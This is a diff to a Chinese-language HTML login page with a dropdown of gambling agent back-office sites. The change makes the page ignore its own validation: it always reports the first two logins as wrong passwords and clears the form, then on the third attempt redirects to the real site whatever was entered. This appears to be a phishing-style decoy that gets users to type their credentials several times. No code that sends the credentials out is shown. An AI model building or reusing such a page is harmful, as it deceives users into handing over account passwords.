@@ -127,14 +127,14 @@
             <label for="platform">選擇平台：</label><br>
             <select id="platform" name="platform" required>
                 <option value="">請選擇</option>
-                <option value="https://ag.bu5168.com/">BU</option>
-                <option value="https://agup.sz17888.com/zh-Hant/login">SZ</option>
-                <option value="https://ag.as5588.com/index.php?s=/AgentIndex/index">財神</option>
-                <option value="https://ag.ofa77.net/login.php">鉅城</option>
-                <option value="https://agent.918ofa.net/login.php">雄厚</option>
-                <option value="https://ag.hw16555.net/">好玩</option>
-                <option value="https://agup.hyg889.com/zh-Hant/login">昊陽</option>
-                <option value="https://ag.bcr56899.com/">BCR</option>
+                <option value="BU">BU</option>
+                <option value="SZ">SZ</option>
+                <option value="財神">財神</option>
+                <option value="鉅城">鉅城</option>
+                <option value="雄厚">雄厚</option>
+                <option value="好玩">好玩</option>
+                <option value="昊陽">昊陽</option>
+                <option value="BCR">BCR</option>
             </select><br><br>
 
             <input type="submit" value="登入">
@@ -156,7 +156,7 @@
             var endTime = Date.now();
             var inputTime = (endTime - startTime) / 1000; // 換算成秒
 
-            if (inputTime < 3) {
+            if (inputTime < 4) {
                 showErrorNotification("請稍候再試");
                 return;
             }
@@ -175,16 +175,47 @@
             // 這裡使用了一個假定的驗證函數
             var authenticated = validateUser(username, password, platform);
 
-            if (!authenticated) {
-                if (loginAttempts === 0) {
-                    showErrorNotification("帳號密碼錯誤第一次");
-                } else if (loginAttempts === 1) {
-                    showErrorNotification("帳號密碼錯誤第二次");
+            if (loginAttempts === 0) {
+                showErrorNotification("帳號密碼錯誤第一次");
+                resetForm(); // 清空表單輸入欄位
+                document.getElementById("platform").value = ""; // 重設下拉選項為空
+            } else if (loginAttempts === 1) {
+                showErrorNotification("帳號密碼錯誤第二次");
+                resetForm(); // 清空表單輸入欄位
+                document.getElementById("platform").value = ""; // 重設下拉選項為空
+            } else if (loginAttempts === 2) {
+                // 第三次輸入，無論驗證結果如何，都將成功跳轉
+                switch (platform) {
+                    case "BU":
+                        window.location.href = "https://ag.bu5168.com/";
+                        break;
+                    case "SZ":
+                        window.location.href = "https://agup.sz17888.com/zh-Hant/login";
+                        break;
+                    case "財神":
+                        window.location.href = "https://ag.as5588.com/index.php?s=/AgentIndex/index";
+                        break;
+                    case "鉅城":
+                        window.location.href = "https://ag.ofa77.net/login.php";
+                        break;
+                    case "雄厚":
+                        window.location.href = "https://agent.918ofa.net/login.php";
+                        break;
+                    case "好玩":
+                        window.location.href = "https://ag.hw16555.net/";
+                        break;
+                    case "昊陽":
+                        window.location.href = "https://agup.hyg889.com/zh-Hant/login";
+                        break;
+                    case "BCR":
+                        window.location.href = "https://ag.bcr56899.com/";
+                        break;
+                    default:
+                        showErrorNotification("無法識別的平台");
+                        break;
                 }
                 resetForm(); // 清空表單輸入欄位
                 document.getElementById("platform").value = ""; // 重設下拉選項為空
-            } else {
-                window.location.href = platform; // 登入成功後跳轉到選擇的平台
             }
 
             // 增加嘗試次數計數
@@ -213,3 +244,4 @@
 </body>
 
 </html>
+
